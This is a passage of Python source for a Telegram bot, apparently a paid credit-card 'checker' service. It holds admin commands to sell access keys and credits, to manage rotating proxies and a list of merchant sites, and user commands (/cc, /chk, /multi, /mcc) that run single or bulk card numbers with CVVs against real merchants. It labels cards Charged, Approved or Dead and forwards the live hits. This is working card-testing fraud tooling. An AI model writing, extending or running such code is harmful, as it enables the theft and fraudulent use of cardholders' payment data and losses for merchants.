        try:
            quantity = min(int(args[2]), 100)
        except:
            pass

    if plan_key not in PLANS:
        await event.reply(f"❌ Invalid plan! Available: trial, bronze, silver, gold, platinum", parse_mode='html')
        return

    plan_info = PLANS[plan_key]
    keys_data = load_keys()
    new_keys = []

    for _ in range(quantity):
        key = 'BUBU-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) + '-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) + '-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        keys_data[key] = {
            'plan': plan_key,
            'days': plan_info['days'],
            'credits': plan_info['credits'],
            'created': datetime.now().isoformat()
        }
        new_keys.append(key)

    save_keys(keys_data)

    if quantity == 1:
        await event.reply(
            f"🔐 <b>Premium Key Generated!</b>\n\n"
            f"<code>{new_keys[0]}</code>\n\n"
            f"📋 Plan: {plan_info['name']}\n"
            f"📅 Days: {plan_info['days']}\n"
            f"💰 Credits: {plan_info['credits']}",
            parse_mode='html')
    else:
        keys_text = "\n".join([f"<code>{k}</code>" for k in new_keys])
        await event.reply(
            f"🔐 <b>{quantity} Premium Keys Generated!</b>\n\n"
            f"{keys_text}\n\n"
            f"📋 Plan: {plan_info['name']}\n"
            f"📅 Days: {plan_info['days']}\n"
            f"💰 Credits: {plan_info['credits']}",
            parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/gencreditkey(@\w+)?(\s+.*)?$'))
async def gencreditkey(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/gencreditkey credits [quantity]</code>", parse_mode='html')

    try:
        credits = int(args[1])
    except:
        return await event.reply("❌ Invalid credits amount!", parse_mode='html')

    quantity = 1
    if len(args) >= 3:
        try:
            quantity = min(int(args[2]), 100)
        except:
            pass

    credit_keys = load_credit_keys()
    new_keys = []

    for _ in range(quantity):
        key = 'CRED-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) + '-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        credit_keys[key] = {
            'credits': credits,
            'created': datetime.now().isoformat()
        }
        new_keys.append(key)

    save_credit_keys(credit_keys)

    if quantity == 1:
        await event.reply(
            f"💰 <b>Credit Key Generated!</b>\n\n"
            f"<code>{new_keys[0]}</code>\n\n"
            f"💰 Credits: {credits}",
            parse_mode='html')
    else:
        keys_text = "\n".join([f"<code>{k}</code>" for k in new_keys])
        await event.reply(
            f"💰 <b>{quantity} Credit Keys Generated!</b>\n\n"
            f"{keys_text}\n\n"
            f"💰 Credits per key: {credits}",
            parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/stats(@\w+)?(\s+.*)?$'))
async def stats(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    hit_data = load_hit_stats()
    uid = str(user_id)
    user_stats = hit_data.get(uid, {"charged": 0, "approved": 0, "dead": 0, "total": 0})

    total_users = len(hit_data)
    total_charged = sum(s.get('charged', 0) for s in hit_data.values())
    total_approved = sum(s.get('approved', 0) for s in hit_data.values())
    total_dead = sum(s.get('dead', 0) for s in hit_data.values())
    total_all = sum(s.get('total', 0) for s in hit_data.values())

    credits = get_user_credits(user_id)
    plan_name = get_user_plan_name(user_id)

    text = f"""<b>📊 STATISTICS</b>
<b>─────────────────────</b>
<b>👤 Your Stats:</b>
<b>⚡ Charged:</b> {user_stats.get('charged', 0)}
<b>💀 Approved:</b> {user_stats.get('approved', 0)}
<b>⬛ Dead:</b> {user_stats.get('dead', 0)}
<b>📊 Total:</b> {user_stats.get('total', 0)}
<b>─────────────────────</b>
<b>🌐 Global Stats:</b>
<b>👥 Total Users:</b> {total_users}
<b>⚡ Total Charged:</b> {total_charged}
<b>💀 Total Approved:</b> {total_approved}
<b>⬛ Total Dead:</b> {total_dead}
<b>📊 Total Checks:</b> {total_all}
<b>─────────────────────</b>
<b>📋 Plan:</b> {plan_name}
<b>💰 Credits:</b> {credits}
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast(@\w+)?(\s+.*)?$'))
async def broadcast(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a message to broadcast!", parse_mode='html')

    replied = await event.get_reply_message()
    premium_data = load_premium_users()
    credits_data = load_credits()

    all_users = set()
    all_users.update(premium_data.keys())
    all_users.update(credits_data.keys())

    all_users.discard(str(user_id))

    success = 0
    failed = 0
    status_msg = await event.reply(f"📢 Broadcasting to {len(all_users)} users...", parse_mode='html')

    for uid in all_users:
        try:
            await bot.send_message(int(uid), replied)
            success += 1
        except:
            failed += 1
        await asyncio.sleep(0.5)

    await status_msg.edit(
        f"✅ <b>Broadcast Complete!</b>\n\n"
        f"✅ Sent: {success}\n"
        f"❌ Failed: {failed}",
        parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/groupmode(@\w+)?(\s+.*)?$'))
async def groupmode(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/groupmode on|off</code>", parse_mode='html')

    mode = args[1].lower()
    settings = load_group_settings()
    if mode == 'on':
        settings['group_enabled'] = True
        save_group_settings(settings)
        await event.reply("✅ <b>Group Mode: ON</b>", parse_mode='html')
    elif mode == 'off':
        settings['group_enabled'] = False
        save_group_settings(settings)
        await event.reply("✅ <b>Group Mode: OFF</b>", parse_mode='html')
    else:
        await event.reply("❌ Usage: <code>/groupmode on|off</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/filter(@\w+)?(\s+.*)?$'))
async def filter_command(event):
    global ACTIVE_FILTER
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        filters_text = "\n".join([f"➡️ <code>/{key}</code> - {val['name']}" for key, val in SITE_FILTERS.items()])
        await event.reply(f"<b>🎯 Site Price Filters</b>\n\n{filters_text}\n\n<b>Current Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n<b>Usage:</b> <code>/filter under10</code>", parse_mode='html')
        return

    filter_key = args[1].lower()
    if filter_key not in SITE_FILTERS:
        await event.reply(f"❌ Invalid filter. Use: {', '.join(SITE_FILTERS.keys())}", parse_mode='html')
        return

    ACTIVE_FILTER = filter_key
    await event.reply(f"✅ <b>Filter Updated!</b>\n\nNow using: {SITE_FILTERS[ACTIVE_FILTER]['name']}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/site(@\w+)?(\s+.*)?$'))
async def site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    sites = load_sites()
    if not sites:
        return await event.reply("❌ `sites.txt` is empty. Nothing to check.", parse_mode='html')

    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ No proxies available. Please add proxies.", parse_mode='html')

    status_msg = await event.reply(f"🔄 Checking {len(sites)} sites...", parse_mode='html')

    alive_sites = []
    dead_sites = []
    batch_size = 10

    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies
            tasks = [test_site(s, random.choice(fresh_proxies)) for s in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])

            await status_msg.edit(f"🔄 Checking sites...\n\n<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Dead:</b> {len(dead_sites)}", parse_mode='html')

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        summary_msg = f"✅ <b>Site Check Complete!</b>\n\n<b>Total Sites:</b> {len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Removed:</b> {len(dead_sites)}\n\n<code>sites.txt</code> has been updated."

        await status_msg.edit(summary_msg, parse_mode='html')

    except Exception as e:
        await status_msg.edit(f"❌ An error occurred: {e}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getsites(@\w+)?(?:\s|$)'))
async def get_sites_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    if not os.path.exists(SITES_FILE):
        return await event.reply("❌ `sites.txt` file not found.", parse_mode='html')

    sites = get_file_lines(SITES_FILE)
    if not sites:
        return await event.reply("❌ `sites.txt` is empty.", parse_mode='html')

    total = len(sites)
    await event.reply(
        f"📄 <b>Sites File</b>\n\n📊 Total Sites: {total}\n\n✅ Sending <code>sites.txt</code> file...",
        file=SITES_FILE,
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/addsite(@\w+)?(\s+)?'))
async def addsite_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    full_text = event.message.text
    lines = full_text.strip().split('\n')

    if len(lines) < 2:
        return await event.reply("❌ Usage:\n<code>/addsite</code>\n<code>site_url</code>\n<code>site_url</code>\n\nAdd one site per line after the command.", parse_mode='html')

    site_lines = [s.strip() for s in lines[1:] if s.strip()]
    added, already = add_sites_bulk(site_lines)

    await event.reply(f"✅ <b>Sites Added!</b>\n\n➕ New: {len(added)}\n⏭️ Already existed: {len(already)}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsitetxt(@\w+)?(\s+)?'))
async def addsitetxt_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a <code>.txt</code> file with <code>/addsitetxt</code>", parse_mode='html')

    replied = await event.get_reply_message()
    if not replied.file:
        return await event.reply("❌ No file found. Reply to a .txt file!", parse_mode='html')

    if not replied.file.name.endswith('.txt'):
        return await event.reply("❌ Only .txt files supported!", parse_mode='html')

    status_msg = await event.reply("⏳ Downloading file...", parse_mode='html')

    file_path = f"sites_bulk_{user_id}.txt"
    await bot.download_media(replied, file_path)

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]

    os.remove(file_path)

    added, already = add_sites_bulk(lines)

    msg = f"✅ <b>Sites Added!</b>\n\n➕ New: {len(added)}\n⏭️ Already existed: {len(already)}"
    if added:
        msg += f"\n\n<b>Added:</b>\n"
        for s in added[:10]:
            msg += f"🌐 {s}\n"
        if len(added) > 10:
            msg += f"and {len(added) - 10} more..."

    await status_msg.edit(msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm(@\w+)?(\s+)?'))
async def rm_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split('\n')
    if len(args) < 2 or not args[1].strip():
        return await event.reply("❌ Usage: <code>/rm site_url</code>", parse_mode='html')

    site_to_remove = args[1].strip()
    if remove_site(site_to_remove):
        await event.reply(f"✅ <b>Site Removed!</b>\n\n🌐 {site_to_remove}", parse_mode='html')
    else:
        await event.reply(f"❌ Site not found: {site_to_remove}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearsite(@\w+)?(?:\s|$)'))
async def clear_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    sites = load_sites()
    if not sites:
        return await event.reply("❌ `sites.txt` is already empty.", parse_mode='html')

    backup_file = f"sites_backup_{int(time.time())}.txt"
    with open(backup_file, 'w', encoding='utf-8') as f:
        for s in sites:
            f.write(f"{s}\n")

    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        f.write('')

    await event.reply(f"✅ <b>Sites Cleared!</b>\n\n🗑️ Removed: {len(sites)} sites\n💾 Backup saved: <code>{backup_file}</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy(@\w+)?(\s+)?'))
async def proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ `proxy.txt` is empty. Nothing to check.", parse_mode='html')

    status_msg = await event.reply(f"🔄 Checking {len(proxies)} proxies...", parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    batch_size = 10

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(f"🔄 Checking proxies...\n\n<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Dead:</b> {len(dead_proxies)}", parse_mode='html')

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n<b>Total Proxies:</b> {len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Removed:</b> {len(dead_proxies)}\n\n<code>proxy.txt</code> has been updated."

        await status_msg.edit(summary_msg, parse_mode='html')

    except Exception as e:
        await status_msg.edit(f"❌ An error occurred: {e}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxy(@\w+)?(?:\s|$)'))
async def addproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    full_text = event.message.text
    lines = full_text.strip().split('\n')

    if len(lines) < 2:
        return await event.reply("❌ Usage:\n<code>/addproxy</code>\n<code>ip:port:user:pass</code>\n<code>ip:port:user:pass</code>\n\nAdd one proxy per line after the command.", parse_mode='html')

    proxy_lines = [p.strip() for p in lines[1:] if p.strip()]

    current_proxies = load_proxies()
    added = 0
    already = 0

    for proxy in proxy_lines:
        if proxy not in current_proxies:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                await f.write(f"{proxy}\n")
            current_proxies.append(proxy)
            added += 1
        else:
            already += 1

    await event.reply(f"✅ <b>Proxies Added!</b>\n\n➕ New: {added}\n⏭️ Already existed: {already}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxytxt(@\w+)?(\s+)?'))
async def addproxytxt_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a <code>.txt</code> file with <code>/addproxytxt</code>", parse_mode='html')

    replied = await event.get_reply_message()
    if not replied.file:
        return await event.reply("❌ No file found. Reply to a .txt file!", parse_mode='html')

    if not replied.file.name.endswith('.txt'):
        return await event.reply("❌ Only .txt files supported!", parse_mode='html')

    status_msg = await event.reply("⏳ Downloading file...", parse_mode='html')

    file_path = f"proxy_bulk_{user_id}.txt"
    await bot.download_media(replied, file_path)

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]

    os.remove(file_path)

    current_proxies = load_proxies()
    added = 0
    already = 0

    for proxy in lines:
        if proxy not in current_proxies:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                await f.write(f"{proxy}\n")
            current_proxies.append(proxy)
            added += 1
        else:
            already += 1

        msg = f"✅ <b>Proxies Added!</b>\n\n➕ New: {added}\n⏭️ Already existed: {already}"
        

    await status_msg.edit(msg, parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/cc(@\w+)?(\s+.*)?$'))
async def cc_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    if not check_rate_limit(user_id):
        return

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/cc 4000220000000000|12|2026|123</code>", parse_mode='html')

    card_input = args[1].strip()
    cards = extract_cc(card_input)

    if not cards:
        return await event.reply("❌ Invalid card format. Use: <code>cc|mm|yy|cvv</code>", parse_mode='html')

    card = cards[0]

    credits = get_user_credits(user_id)
    if credits < 1:
        if is_admin(user_id):
            pass
        else:
            return await event.reply("❌ <b>No credits!</b>\n\n💰 Redeem credits: /redeemcredit\n💎 Get Premium: /plans", parse_mode='html')

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        return await event.reply("❌ <b>No sites available!</b>", parse_mode='html')
    if not proxies:
        return await event.reply("❌ <b>No proxies available!</b>", parse_mode='html')

    status_msg = await event.reply("🔄 <b>Checking card...</b>\n\n💳 <code>{}</code>".format(card), parse_mode='html')

    if not is_admin(user_id) and not is_premium(user_id):
        deduct_credit(user_id)

    if is_premium(user_id):
        user_proxies = get_user_specific_proxies(user_id)
        if user_proxies:
            proxies_to_use = user_proxies + proxies
        else:
            proxies_to_use = proxies
    else:
        proxies_to_use = proxies

    result = await check_card_with_retry(card, sites, proxies_to_use)

    status = result.get('status', 'Dead')
    response_msg = result.get('message', '')
    gateway = result.get('gateway', 'Unknown')
    price = result.get('price', '-')

    if status == 'Charged':
        hit_type = "charged"
        emoji = "⚡"
        record_hit(user_id, "charged")
        username = event.sender.username
        await send_log_to_channel(response_msg, gateway, price, username, user_id, card)
    elif status == 'Approved':
        hit_type = "approved"
        emoji = "💀"
        record_hit(user_id, "approved")
    elif status in ['Site Error', 'Invalid Format']:
        hit_type = "dead"
        emoji = "⚠️"
        record_hit(user_id, "dead")
    else:
        hit_type = "dead"
        emoji = "⬛"
        record_hit(user_id, "dead")

    final_msg = f"{emoji} <b>{status.upper()}</b>\n"
    final_msg += f"<b>─────────────────────</b>\n"
    final_msg += f"<b>Card ➡</b> <code>{card}</code>\n"
    final_msg += f"<b>Response ➡</b> {response_msg[:200]}\n"
    final_msg += f"<b>Gateway ➡</b> {gateway}\n"
    final_msg += f"<b>Price ➡</b> {price}\n"
    final_msg += f"<b>─────────────────────</b>\n"
    final_msg += f"<b>👤 User:</b> <code>{user_id}</code>\n"
    final_msg += f"<b>📋 Plan:</b> {get_user_plan_name(user_id)}\n"
    final_msg += f"<b>💰 Credits Left:</b> {get_user_credits(user_id)}\n"
    final_msg += f"<b>─────────────────────</b>\n"
    final_msg += "🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"

    try:
        await status_msg.edit(final_msg, parse_mode='html')
    except:
        await status_msg.edit(final_msg)

    if hit_type in ["charged", "approved"]:
        await send_realtime_hit_to_user(user_id, hit_type.upper(), card, response_msg, gateway, price)

    await check_credits_low(user_id)

@bot.on(events.NewMessage(pattern=r'^/chk(@\w+)?(\s+.*)?$'))
async def chk_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a <code>.txt</code> file with <code>/chk</code>", parse_mode='html')

    replied = await event.get_reply_message()
    if not replied.file:
        return await event.reply("❌ No file found. Reply to a .txt file!", parse_mode='html')

    credits = get_user_credits(user_id)
    if credits < 1:
        if is_admin(user_id):
            pass
        else:
            return await event.reply("❌ <b>No credits!</b>\n\n💰 Redeem credits: /redeemcredit\n💎 Get Premium: /plans", parse_mode='html')

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        return await event.reply("❌ <b>No sites available!</b>", parse_mode='html')
    if not proxies:
        return await event.reply("❌ <b>No proxies available!</b>", parse_mode='html')

    if is_premium(user_id):
        user_proxies = get_user_specific_proxies(user_id)
        if user_proxies:
            proxies_to_use = user_proxies + proxies
        else:
            proxies_to_use = proxies
    else:
        proxies_to_use = proxies

    status_msg = await event.reply("⏳ Downloading file...", parse_mode='html')

    file_path = f"cards_chk_{user_id}.txt"
    await bot.download_media(replied, file_path)

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    os.remove(file_path)

    all_cards = extract_cc(content)
    if not all_cards:
        return await status_msg.edit("❌ No valid cards found in file!", parse_mode='html')

    total_cards = len(all_cards)
    max_check = min(total_cards, credits) if not is_admin(user_id) else total_cards

    if not is_admin(user_id) and not is_premium(user_id):
        max_check = min(max_check, credits)

    cards_to_check = all_cards[:max_check]

    charged_count = 0
    approved_count = 0
    dead_count = 0
    error_count = 0

    await status_msg.edit(f"🔄 <b>Checking...</b>\n\n💳 Card: 1/{len(cards_to_check)}\n⚡ Charged: 0\n💀 Approved: 0\n⬛ Dead: 0", parse_mode='html')

    for i, card in enumerate(cards_to_check):
        result = await check_card_with_retry(card, sites, proxies_to_use)

        status = result.get('status', 'Dead')
        response_msg = result.get('message', '')
        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', '-')

        if status == 'Charged':
            charged_count += 1
            record_hit(user_id, "charged")
            username = event.sender.username
            await send_log_to_channel(response_msg, gateway, price, username, user_id, card)
            await send_realtime_hit_to_user(user_id, "CHARGED", card, response_msg, gateway, price)
        elif status == 'Approved':
            approved_count += 1
            record_hit(user_id, "approved")
            await send_realtime_hit_to_user(user_id, "APPROVED", card, response_msg, gateway, price)
        elif status in ['Site Error', 'Dead']:
            dead_count += 1
            record_hit(user_id, "dead")
        else:
            error_count += 1
            record_hit(user_id, "dead")

        if not is_admin(user_id):
            deduct_credit(user_id)

        if (i + 1) % 5 == 0 or i == len(cards_to_check) - 1:
            try:
                await status_msg.edit(
                    f"🔄 <b>Checking...</b>\n\n"
                    f"💳 Card: {i+1}/{len(cards_to_check)}\n"
                    f"⚡ Charged: {charged_count}\n"
                    f"💀 Approved: {approved_count}\n"
                    f"⬛ Dead: {dead_count}\n"
                    f"⚠️ Error: {error_count}",
                    parse_mode='html'
                )
            except:
                pass

        if not is_admin(user_id):
            current_credits = get_user_credits(user_id)
            if current_credits <= 0:
                break

    summary = f"""✅ <b>Check Complete!</b>
<b>─────────────────────</b>
<b>💳 Total Cards:</b> {len(cards_to_check)}
<b>⚡ Charged:</b> {charged_count}
<b>💀 Approved:</b> {approved_count}
<b>⬛ Dead:</b> {dead_count}
<b>⚠️ Error:</b> {error_count}
<b>─────────────────────</b>
<b>📋 Plan:</b> {get_user_plan_name(user_id)}
<b>💰 Credits Left:</b> {get_user_credits(user_id)}
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    try:
        await status_msg.edit(summary, parse_mode='html')
    except:
        await status_msg.edit(summary)

    await check_credits_low(user_id)

@bot.on(events.NewMessage(pattern=r'^/multi(@\w+)?(\s+.*)?$'))
async def multi_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    if not check_rate_limit(user_id):
        return

    full_text = event.message.text
    lines = full_text.strip().split('\n')

    if len(lines) < 2:
        return await event.reply("❌ Usage:\n<code>/multi</code>\n<code>cc|mm|yy|cvv</code>\n<code>cc|mm|yy|cvv</code>", parse_mode='html')

    card_lines = [line.strip() for line in lines[1:] if line.strip()]
    all_cards = []
    for line in card_lines:
        cards = extract_cc(line)
        all_cards.extend(cards)

    if not all_cards:
        return await event.reply("❌ No valid cards found!", parse_mode='html')

    credits = get_user_credits(user_id)
    if credits < 1:
        if is_admin(user_id):
            pass
        else:
            return await event.reply("❌ <b>No credits!</b>\n\n💰 Redeem credits: /redeemcredit\n💎 Get Premium: /plans", parse_mode='html')

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        return await event.reply("❌ <b>No sites available!</b>", parse_mode='html')
    if not proxies:
        return await event.reply("❌ <b>No proxies available!</b>", parse_mode='html')

    if is_premium(user_id):
        user_proxies = get_user_specific_proxies(user_id)
        if user_proxies:
            proxies_to_use = user_proxies + proxies
        else:
            proxies_to_use = proxies
    else:
        proxies_to_use = proxies

    max_check = min(len(all_cards), credits) if not is_admin(user_id) else len(all_cards)

    if not is_admin(user_id) and not is_premium(user_id):
        max_check = min(max_check, credits)

    cards_to_check = all_cards[:max_check]

    status_msg = await event.reply(f"🔄 <b>Multi Check...</b>\n\n💳 Cards: {len(cards_to_check)}\n⚡ Charged: 0\n💀 Approved: 0\n⬛ Dead: 0", parse_mode='html')

    charged_count = 0
    approved_count = 0
    dead_count = 0
    error_count = 0

    for i, card in enumerate(cards_to_check):
        result = await check_card_with_retry(card, sites, proxies_to_use)

        status = result.get('status', 'Dead')
        response_msg = result.get('message', '')
        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', '-')

        if status == 'Charged':
            charged_count += 1
            record_hit(user_id, "charged")
            username = event.sender.username
            await send_log_to_channel(response_msg, gateway, price, username, user_id, card)
            await send_realtime_hit_to_user(user_id, "CHARGED", card, response_msg, gateway, price)
        elif status == 'Approved':
            approved_count += 1
            record_hit(user_id, "approved")
            await send_realtime_hit_to_user(user_id, "APPROVED", card, response_msg, gateway, price)
        elif status in ['Site Error', 'Dead']:
            dead_count += 1
            record_hit(user_id, "dead")
        else:
            error_count += 1
            record_hit(user_id, "dead")

        if not is_admin(user_id):
            deduct_credit(user_id)

        if (i + 1) % 5 == 0 or i == len(cards_to_check) - 1:
            try:
                await status_msg.edit(
                    f"🔄 <b>Multi Check...</b>\n\n"
                    f"💳 Card: {i+1}/{len(cards_to_check)}\n"
                    f"⚡ Charged: {charged_count}\n"
                    f"💀 Approved: {approved_count}\n"
                    f"⬛ Dead: {dead_count}\n"
                    f"⚠️ Error: {error_count}",
                    parse_mode='html'
                )
            except:
                pass

        if not is_admin(user_id):
            current_credits = get_user_credits(user_id)
            if current_credits <= 0:
                break

    summary = f"""✅ <b>Multi Check Complete!</b>
<b>─────────────────────</b>
<b>💳 Total Cards:</b> {len(cards_to_check)}
<b>⚡ Charged:</b> {charged_count}
<b>💀 Approved:</b> {approved_count}
<b>⬛ Dead:</b> {dead_count}
<b>⚠️ Error:</b> {error_count}
<b>─────────────────────</b>
<b>📋 Plan:</b> {get_user_plan_name(user_id)}
<b>💰 Credits Left:</b> {get_user_credits(user_id)}
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    try:
        await status_msg.edit(summary, parse_mode='html')
    except:
        await status_msg.edit(summary)

    await check_credits_low(user_id)

@bot.on(events.NewMessage(pattern=r'^/mcc(@\w+)?(\s+.*)?$'))
async def mcc_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a <code>.txt</code> with multiple cards + optional per-line proxies.", parse_mode='html')

    replied = await event.get_reply_message()
    if not replied.file:
        return await event.reply("❌ No file found. Reply to a .txt file!", parse_mode='html')

    credits = get_user_credits(user_id)
    if credits < 1:
        if is_admin(user_id):
            pass
        else:
            return await event.reply("❌ <b>No credits!</b>\n\n💰 Redeem credits: /redeemcredit\n💎 Get Premium: /plans", parse_mode='html')

    sites = load_sites()
    fallback_proxies = load_proxies()

    if not sites:
        return await event.reply("❌ <b>No sites available!</b>", parse_mode='html')
    if not fallback_proxies:
        return await event.reply("❌ <b>No proxies available!</b>", parse_mode='html')

    if is_premium(user_id):
        user_proxies = get_user_specific_proxies(user_id)
        if user_proxies:
            fallback_proxies = user_proxies + fallback_proxies

    status_msg = await event.reply("⏳ Downloading file...", parse_mode='html')

    file_path = f"cards_mcc_{user_id}.txt"
    await bot.download_media(replied, file_path)

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]

    os.remove(file_path)

    max_check = min(len(lines), credits) if not is_admin(user_id) else len(lines)

    if not is_admin(user_id) and not is_premium(user_id):
        max_check = min(max_check, credits)

    lines_to_check = lines[:max_check]

    if not lines_to_check:
        return await status_msg.edit("❌ No lines found in file!", parse_mode='html')

    charged_count = 0
    approved_count = 0
    dead_count = 0

    await status_msg.edit(f"🔄 <b>Mass Check...</b>\n\n💳 Checking: {len(lines_to_check)} lines\n⚡ Charged: 0\n💀 Approved: 0\n⬛ Dead: 0", parse_mode='html')

    for i, line in enumerate(lines_to_check):
        parts = line.split()
        custom_proxy = None

        if len(parts) >= 5 and ':' in parts[4]:
            card_text = ' '.join(parts[:4])
            custom_proxy = parts[4]
        else:
            card_text = ' '.join(parts[:4])

        cards = extract_cc(card_text)
        if not cards:
            continue

        card = cards[0]

        if custom_proxy:
            proxies_to_use = [custom_proxy] + fallback_proxies
        else:
            proxies_to_use = fallback_proxies

        result = await check_card_with_retry(card, sites, proxies_to_use)

        status = result.get('status', 'Dead')
        response_msg = result.get('message', '')
        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', '-')

        if status == 'Charged':
            charged_count += 1
            record_hit(user_id, "charged")
            username = event.sender.username
